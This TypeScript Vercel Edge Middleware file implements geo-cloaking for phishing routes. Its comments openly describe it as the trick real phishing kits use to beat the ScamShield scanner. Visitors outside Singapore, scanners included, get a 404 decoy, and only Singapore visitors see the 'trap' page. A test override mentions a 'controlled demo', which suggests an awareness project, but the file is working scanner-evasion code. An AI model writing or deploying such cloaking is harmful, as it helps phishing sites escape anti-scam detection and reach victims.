// Vercel Edge Middleware — geo-cloaking, the core "beats ScamShield" trick.
// Real phishing kits serve a harmless decoy to scanners (datacenter / non-target
// geo) and the real page only to victims in the target country. We mirror that:
// non-SG visitors get a plain 404 decoy; only a Singapore visitor sees the trap.
// A ?force=real|decoy override exists for local testing / a controlled demo.
import { next, rewrite } from "@vercel/edge";

export const config = {
  // Only guard the phishing routes; let assets/api through untouched.
  matcher: ["/", "/verify", "/meme"],
};

export default function middleware(req: Request) {
  const url = new URL(req.url);
  const force = url.searchParams.get("force");
  if (force === "real") return next();
  if (force === "decoy") return rewrite(new URL("/decoy.html", req.url));

  const country = (req.headers.get("x-vercel-ip-country") || "").toUpperCase();
  // Unknown geo (rare) is treated as a scanner → decoy, so we never leak the
  // real page to something we can't place in Singapore.
  if (country === "SG") return next();
  return rewrite(new URL("/decoy.html", req.url));
}
